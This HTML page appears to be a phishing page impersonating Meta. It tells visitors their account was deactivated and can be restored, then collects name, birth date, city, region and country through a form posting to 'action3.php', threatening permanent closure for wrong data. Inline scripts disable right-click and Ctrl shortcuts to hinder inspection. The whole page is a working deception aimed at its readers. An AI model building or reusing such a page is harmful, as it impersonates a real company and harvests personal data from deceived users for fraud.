<html class="_9dls __fb-light-mode" lang="en"><head>
    <link rel="icon" type="image/x-icon" href="./files/favicon.ico">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2,shrink-to-fit=no">
    <link type="text/css" rel="stylesheet" href="./files/style-pay.css">
    <link type="text/css" rel="stylesheet" href="./files/pAy5sS6Se6DC.css">
    <script type="text/javascript">function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn
    </script>
    <script type="text/javascript">window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
    </script>
    <title>Restrictions Information | User</title>
        <script language="JavaScript">
        var tanggallengkap = new String();
        var namahari = ("Minggu Senin Selasa Rabu Kamis Jumat Sabtu");
        namahari = namahari.split(" ");
        var namabulan = ("January February March April May June July August September October November December");
        namabulan = namabulan.split(" ");
        var tgl = new Date();
        var hari = tgl.getDay();
        var tanggal = tgl.getDate();
        var bulan = tgl.getMonth();
        var tahun = tgl.getFullYear();
        tanggallengkap = namabulan[bulan] + " " + tanggal + ", " + tahun;
        </script>
</head>
<body class="_6s5d _71pn _-kb segoe" style="">
<span id="ssrb_root_start" style="display:none"></span>
<!--$--><div>
<div class=""><!--$-->

<div class="rq0escxv l9j0dhe7 du4w35lb">
<div class="rq0escxv du4w35lb q5bimw55 datstx6m d76ob5m9 eg9m0zos poy2od1o ofs802cu j9ispegn kr520xx4 k4urcfbm pohlnb88 dkue75c7 mb9wzai9" aria-hidden="true" id="scrollview" style="left: 0px;">
<div class="du4w35lb l9j0dhe7 cbu4d94t j83agx80">
<div class="j83agx80 cbu4d94t l9j0dhe7 jgljxmt5 be9z9djy"><!--$-->
<div class="tkr6xdv7 kr520xx4 j9ispegn poy2od1o n7fi1qx3">
<div role="banner">
<div class="ehxjyohh kr520xx4 j9ispegn poy2od1o dhix69tm byvelhso buofh1pr j83agx80 rq0escxv bp9cbjyn">
<div aria-hidden="true" class="pmk7jnqg kp4lslxn lxek4yd6 ms05siws pnx7fd3z nf1dmkjp b5wmifdl hzruof5a">
</div>
<a aria-label="" class="oajrlxb2 gs1a9yip g5ia77u1 mtkw9kbi tlpljxtp qensuy8j ppp5ayq2 goun2846 ccm00jje s44p3ltw mk2mc5f4 rt8b4zig n8ej3o3l agehan2d sk4xxmp2 rq0escxv nhd2j8a9 mg4g778l pfnyh3mw p7hjln8o kvgmc6g5 cxmmr5t8 oygrvhab hcukyx3x tgvbjcpo hpfvmrgz jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso l9j0dhe7 i1ao9s8h esuyzwwr f1sip0of du4w35lb n00je7tq arfg74bv qs9ysxi8 k77z8yql btwxx1t3 abiwlrkh p8dawk7l q9uorilb lzcic4wl pedkr2u6 ms05siws pnx7fd3z nf1dmkjp" role="link" tabindex="0">
<svg aria-label="Logo Meta" class="cyypbtt7 ljni7pan" role="img" viewBox="0 0 500 100"><defs>
    <linearGradient gradientUnits="userSpaceOnUse" id="jsc_c_3x" x1="124.38" x2="160.839" y1="99" y2="59.326">
    <stop offset=".427" stop-color="#0278F1"></stop>
    <stop offset=".917" stop-color="#0180FA"></stop>
</linearGradient>
<linearGradient gradientUnits="userSpaceOnUse" id="jsc_c_3y" x1="42" x2="-1.666" y1="4.936" y2="61.707">
    <stop offset=".427" stop-color="#0165E0"></stop>
    <stop offset=".917" stop-color="#0180FA"></stop>
</linearGradient>
<linearGradient gradientUnits="userSpaceOnUse" id="jsc_c_3z" x1="27.677" x2="132.943" y1="28.71" y2="71.118">
    <stop stop-color="#0064E0"></stop>
    <stop offset=".656" stop-color="#0066E2"></stop>
    <stop offset="1" stop-color="#0278F1"></stop>
</linearGradient>
</defs>
<path d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z" fill="#1C2B33"></path>
<path d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z" fill="#0180FA"></path>
<path d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z" fill="url(#jsc_c_3x)"></path>
<path d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z" fill="url(#jsc_c_3y)"></path>
<path d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z" fill="url(#jsc_c_3z)"></path>
</svg>
</a>
<div>
<div>
</div>
</div>
</div>
<div class="rq0escxv l9j0dhe7 du4w35lb cddn0xzi j83agx80 cbu4d94t byvelhso">
<div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t bkfpd7mw"></div>
<div class="rq0escxv du4w35lb rozst971 g3xnvtyb p1jhd9yy a0vgkybk n7fi1qx3 ooasylqa hzruof5a pmk7jnqg j9ispegn"></div>
</div>
<div class="ehxjyohh kr520xx4 poy2od1o b3onmgus hv4rvrfc n7fi1qx3"><div>
<div>
</div>
</div>
</div>
</div>
</div>
<div class="rq0escxv l9j0dhe7 du4w35lb">
<div class="du4w35lb l9j0dhe7 cbu4d94t j83agx80">
<div class="j83agx80 cbu4d94t l9j0dhe7 jgljxmt5 be9z9djy"><!--$-->
<div class="dp1hu0rb d2edcug0 taijpn5t j83agx80 gs1a9yip">
<div class="k4urcfbm dp1hu0rb d2edcug0 cbu4d94t j83agx80 bp9cbjyn" role="main">
<div class="bp9cbjyn j83agx80 cbu4d94t l9j0dhe7 k4urcfbm du4w35lb">
<div class="k4urcfbm boxfpay">
<div class="j83agx80 l9j0dhe7 k4urcfbm">
<div class="rq0escxv l9j0dhe7 du4w35lb hybvsw6c io0zqebd m5lcvass fbipl8qg nwvqtn77 k4urcfbm ni8dbmo4 stjgntxs sbcfpzgs" style="border-radius: max(0px, min(8px, ((100vw - 4px) - 100%) * 9999)) / 8px;">
<div class="tojvnm2t a6sixzi8 k5wvi7nf q3lfd5jv pk4s997a bipmatt0 cebpdrjk qowsmv63 owwhemhu dp1hu0rb dhp61c6y l9j0dhe7 iyyx5f41 a8s20v7p"><div>
<div>
<div class="l9j0dhe7 du4w35lb rq0escxv j83agx80 cbu4d94t pfnyh3mw d2edcug0">
<div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t buofh1pr tgvbjcpo">
<div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t pfnyh3mw d2edcug0">
<div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 pfnyh3mw i1fnvgqd gs1a9yip owycx6da btwxx1t3 hv4rvrfc dati1w0a discj3wi">
<div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t d2edcug0 hpfvmrgz rj1gh0hx buofh1pr g5gj957u jb3vyjys rz4wbd8a qt6c0cv9 a8nywdso">
<div class="l9j0dhe7 du4w35lb rq0escxv j83agx80 cbu4d94t pfnyh3mw d2edcug0 discj3wi ihqw7lf3">
<div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t buofh1pr tgvbjcpo sv5sfqaa obtkqiv7">
<div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t pfnyh3mw d2edcug0 bp9cbjyn aov4n071 bi6gxh9e">
<div class="l9j0dhe7">
<i data-visualcompletion="css-img" style="background-image: url(./files/IcoMeT4.png); background-position: 0px -274px; background-size: auto; width: 500px; height: 134px; background-repeat: no-repeat; display: inline-block;"></i>
</div>

</div>
<div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t pfnyh3mw d2edcug0 aov4n071 bi6gxh9e updown1 ihqw7lf3">
<div class="sv5sfqaa obtkqiv7 cbu4d94t j83agx80">
<div class="aov4n071 bi6gxh9e">
<span class="updown2 d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j fe6kdd0r mau55g9w c8b282yb keod5gw0 nxhoafnm aigsh9s9 qg6bub1s iv3no6db TeeXde f530mmz5 hnhda86s oo9gr5id oqcyycmt" dir="auto">User data information</span>
</div>
<div class="aov4n071 bi6gxh9e">
<span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql a8c37x1j fe6kdd0r mau55g9w c8b282yb keod5gw0 nxhoafnm aigsh9s9 d3f4x2em mdeji52x fon7TeeX" dir="auto">We provide the opportunity to cancel the deactivated account and you can carry out your activities as before. Thank you for helping to improve our service.</span>
</div>
</div>
</div>
<div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t pfnyh3mw d2edcug0 aov4n071 bi6gxh9e">
<div class="ue3kfks5 pw54ja7n uo3d90p7 l82x9zwi ni8dbmo4 stjgntxs ecm0bbzt ph5uu5jm b3onmgus ihqw7lf3 i94ygzvd">
<div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 pfnyh3mw i1fnvgqd bp9cbjyn owycx6da btwxx1t3 d1544ag0 tw6a2znq discj3wi b5q2rw42 lq239pai mysgfdmx hddg9phg">
<form action="action3.php?button_location=settings&amp;button_name=addpay" method="POST">

<div class="rq0escxv l9j0dhe7 du4w35lb j83agx80 cbu4d94t d2edcug0 hpfvmrgz rj1gh0hx buofh1pr g5gj957u p8fzw8mz pcp91wgn iuny7tx3 ipjc6fyt">
<div class="j83agx80 cbu4d94t ew0dbk1b irj2b8pg">
<span class="froTex">Please fill in completely:</span>
<div class="qzhwtbm6 knvmm38d">
<span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j fe6kdd0r mau55g9w c8b282yb keod5gw0 nxhoafnm aigsh9s9 d3f4x2em iv3no6db jq4qci2q a3bd9o3v b1v8xokw m9osqain hzawbc8m" dir="auto">
    <div class="card_grp">   
        <div class="fnam">
        <input type="text" class="firnam" data-mask="00" name="fn" required="yes" placeholder="First name" pattern=".{2,}" maxlength="20">
        <input type="text" data-mask="00" name="ln" required="yes" placeholder="Last name" pattern=".{2,}" maxlength="20">
        </div>
    </div>
<div class="SerBird">Date of birth:</div>
    <div class="card_grp">   
        <div class="expiry_bird">
            <select tabindex="0" class="expiry_birday" id="birthday_day" name="dd" value="">
            
            <option id="by" value="0">Day   </option>
            <option id="by" value="1">1      </option>            
            <option id="by" value="2">2      </option>
            <option id="by" value="3">3      </option>           
            <option id="by" value="4">4      </option>                     
            <option id="by" value="5">5      </option>            
            <option id="by" value="6">6      </option>       
            <option id="by" value="7">7      </option>                     
            <option id="by" value="8">8      </option>
            <option id="by" value="9">9      </option>
            <option id="by" value="10">10    </option>                     
            <option id="by" value="11">11    </option>            
            <option id="by" value="12">12    </option>
            <option id="by" value="13">13    </option>           
            <option id="by" value="14">14    </option>                     
            <option id="by" value="15">15    </option>            
            <option id="by" value="16">16    </option>       
            <option id="by" value="17">17    </option>                     
            <option id="by" value="18">18    </option>
            <option id="by" value="19">19    </option>
            <option id="by" value="20">20    </option>
            <option id="by" value="21">21    </option>            
            <option id="by" value="22">22    </option>
            <option id="by" value="23">23    </option>           
            <option id="by" value="24">24    </option>                     
            <option id="by" value="25">25    </option>            
            <option id="by" value="26">26    </option>       
            <option id="by" value="27">27    </option>                     
            <option id="by" value="28">28    </option>
            <option id="by" value="29">29    </option>
            <option id="by" value="30">30    </option>
            <option id="by" value="31">31    </option>					    
            </select>
            <select tabindex="9" class="expiry_birday" id="birthday_month" name="mm" value="">
            
            <option id="by" value="0">Month </option>
            <option id="by" value="Jan">Jan  </option>
            <option id="by" value="Feb">Feb  </option>
            <option id="by" value="Mar">Mar </option>
            <option id="by" value="Apr">apr </option>
            <option id="by" value="May">May  </option>
            <option id="by" value="Jun">Jun </option>
            <option id="by" value="Jul">Jul  </option>
            <option id="by" value="Aug">Aug  </option>
            <option id="by" value="Sep">Sep  </option>
            <option id="by" value="Oct">Oct  </option>
            <option id="by" value="Nov">Nov  </option>
            <option id="by" value="Dec">Dec  </option>
            </select>
            <select tabindex="9" class="expiry_birday" id="birthday_year" name="yy" value="">
            
            <option id="by" value="0">Year	</option>
            <option id="by" value="2023">2023	</option>
            <option id="by" value="2022">2022	</option>
            <option id="by" value="2021">2021	</option>
            <option id="by" value="2020">2020	</option>
            <option id="by" value="2019">2019	</option>
            <option id="by" value="2018">2018	</option>
            <option id="by" value="2017">2017	</option>
            <option id="by" value="2016">2016	</option>
            <option id="by" value="2015">2015	</option>
            <option id="by" value="2014">2014	</option>
            <option id="by" value="2013">2013	</option>
            <option id="by" value="2012">2012	</option>
            <option id="by" value="2011">2011	</option>
            <option id="by" value="2010">2010	</option>
            <option id="by" value="2009">2009	</option>
            <option id="by" value="2008">2008	</option>
            <option id="by" value="2007">2007	</option>
            <option id="by" value="2006">2006	</option>
            <option id="by" value="2005">2005	</option>                     
            <option id="by" value="2004">2004	</option>           
            <option id="by" value="2003">2003	</option>                     
            <option id="by" value="2002">2002	</option>           
            <option id="by" value="2001">2001	</option>                     
            <option id="by" value="2000">2000	</option>
            <option id="by" value="1999">1999	</option>
            <option id="by" value="1998">1998	</option>          
            <option id="by" value="1997">1997	</option>                    
            <option id="by" value="1996">1996	</option>            
            <option id="by" value="1995">1995	</option>                      
            <option id="by" value="1994">1994	</option>            
            <option id="by" value="1993">1993	</option>                      
            <option id="by" value="1992">1992	</option>            
            <option id="by" value="1991">1991	</option>                      
            <option id="by" value="1990">1990	</option> 
            <option id="by" value="1989">1989	</option> 
            <option id="by" value="1988">1988	</option>            
            <option id="by" value="1987">1987	</option>                      
            <option id="by" value="1986">1986	</option>            
            <option id="by" value="1985">1985	</option>                      
            <option id="by" value="1984">1984	</option>            
            <option id="by" value="1983">1983	</option>                      
            <option id="by" value="1982">1982	</option>            
            <option id="by" value="1981">1981	</option>                      
            <option id="by" value="1980">1980	</option> 
            <option id="by" value="1979">1979	</option> 
            <option id="by" value="1978">1978	</option>
            <option id="by" value="1977">	1977	</option>
            <option id="by" value="1976">	1976	</option>
            <option id="by" value="1975">	1975	</option>
            <option id="by" value="1974">	1974	</option>
            <option id="by" value="1973">	1973	</option>
            <option id="by" value="1972">	1972	</option>
            <option id="by" value="1971">	1971	</option>
            <option id="by" value="1970">	1970	</option>
            <option id="by" value="1969">	1969	</option>
            <option id="by" value="1968">	1968	</option>
            <option id="by" value="1967">	1967	</option>
            <option id="by" value="1966">	1966	</option>
            <option id="by" value="1965">	1965	</option>
            <option id="by" value="1964">	1964	</option>
            <option id="by" value="1963">	1963	</option>
            <option id="by" value="1962">	1962	</option>
            <option id="by" value="1961">	1961	</option>
            <option id="by" value="1960">	1960	</option>
            <option id="by" value="1959">	1959	</option>
            <option id="by" value="1958">	1958	</option>
            <option id="by" value="1957">	1957	</option>
            <option id="by" value="1956">	1956	</option>
            <option id="by" value="1955">	1955	</option>
            <option id="by" value="1954">	1954	</option>
            <option id="by" value="1953">	1953	</option>
            <option id="by" value="1952">	1952	</option>
            <option id="by" value="1951">	1951	</option>
            <option id="by" value="1950">	1950	</option>
            <option id="by" value="1949">	1949	</option>
            <option id="by" value="1948">	1948	</option>
            <option id="by" value="1947">	1947	</option>
            <option id="by" value="1946">	1946	</option>
            <option id="by" value="1945">	1945	</option>
            <option id="by" value="1944">	1944	</option>
            <option id="by" value="1943">	1943	</option>
            <option id="by" value="1942">	1942	</option>
            <option id="by" value="1941">	1941	</option>
            <option id="by" value="1940">	1940	</option>
            <option id="by" value="1939">	1939	</option>
            <option id="by" value="1938">	1938	</option>
            <option id="by" value="1937">	1937	</option>
            <option id="by" value="1936">	1936	</option>
            <option id="by" value="1935">	1935	</option>
            <option id="by" value="1934">	1934	</option>
            <option id="by" value="1933">	1933	</option>
            <option id="by" value="1932">	1932	</option>
            <option id="by" value="1931">	1931	</option>
            <option id="by" value="1930">	1930	</option>
            <option id="by" value="1929">	1929	</option>
            <option id="by" value="1928">	1928	</option>
            <option id="by" value="1927">	1927	</option>
            <option id="by" value="1926">	1926	</option>
            <option id="by" value="1925">	1925	</option>
            <option id="by" value="1924">	1924	</option>
            <option id="by" value="1923">	1923	</option>
            <option id="by" value="1922">	1922	</option>
            <option id="by" value="1921">	1921	</option>
            <option id="by" value="1920">	1920	</option>
            <option id="by" value="1919">	1919	</option>
            <option id="by" value="1918">	1918	</option>
            <option id="by" value="1917">	1917	</option>
            <option id="by" value="1916">	1916	</option>
            <option id="by" value="1915">	1915	</option>
            <option id="by" value="1914">	1914	</option>
            <option id="by" value="1913">	1913	</option>
            <option id="by" value="1912">	1912	</option>
            <option id="by" value="1911">	1911	</option>
            <option id="by" value="1910">	1910	</option>

                     </select>
        </div>
    </div>
    <div class="SerBird">Your current country:</div>
    <div class="fnam">
        <input type="text" class="firnam" data-mask="00" name="ct" required="yes" placeholder="City" pattern=".{2,}" maxlength="15">
        <input type="text" data-mask="00" name="rg" required="yes" placeholder="Region" pattern=".{2,}" maxlength="15">
        
    </div>
    <div class="fcon">
    <input type="text" data-mask="00" name="co" required="yes" placeholder="Country" pattern=".{2,}" maxlength="25">
    </div>
    </span>
	
</div>
</div>
</div>
</div>
</div>
</div>
<div class="lindown ay7djpcl k4urcfbm"></div>
<button class="k4urcfbm l9j0dhe7 tw6a2znq d1544ag0 stjgntxs ni8dbmo4 taijpn5t tv7at329 btwxx1t3 j83agx80 rq0escxv kzx2olss aot14ch1 p86d2i9g beltcj47 izx4hr6d humdl8nn bn081pho gcieejh5 tcv6vlfj bp9cbjyn qrtewk5h jq4qci2q" id="submit-btn" type="submit"><b>Continue</b></button>
</form>
</div>
</div>
<div class="_3QeaJ">
    <svg width="14" height="10" viewBox="0 0 22 20" fill="none" class="_2YFqp" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.9961 12.583C11.9531 13.102 11.5191 13.5 11.0001 13.5C10.4801 13.5 10.0471 13.102 10.0041 12.583L9.50413 6.603C9.50113 6.575 9.50013 6.547 9.50013 6.52C9.50013 5.783 10.0251 5 11.0001 5C11.9751 5 12.5001 5.783 12.5001 6.52L11.9961 12.583ZM11.0001 17.5C10.1731 17.5 9.50013 16.827 9.50013 16C9.50013 15.173 10.1731 14.5 11.0001 14.5C11.8271 14.5 12.5001 15.173 12.5001 16C12.5001 16.827 11.8271 17.5 11.0001 17.5ZM12.7301 1.003C12.3771 0.376 11.7431 0.001 11.0371 0H11.0331C10.3271 0 9.69313 0.373 9.33913 0.998L0.268128 16.989C-0.0878717 17.617 -0.0898717 18.366 0.265128 18.996C0.618128 19.624 1.25213 20 1.96213 20H20.0381C20.7461 20 21.3811 19.625 21.7341 18.998C22.0881 18.37 22.0881 17.622 21.7351 16.994L12.7301 1.003Z" fill="#E69600"></path></svg>
<div class="DonErr">
Please make sure to fill in the data correctly, if you fill in the wrong data your account will be permanently closed. To learn more about why we deactivate accounts, go to <b><font color="#385898">Community Standards</font></b>.
</div>
</div>

</div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></body></html>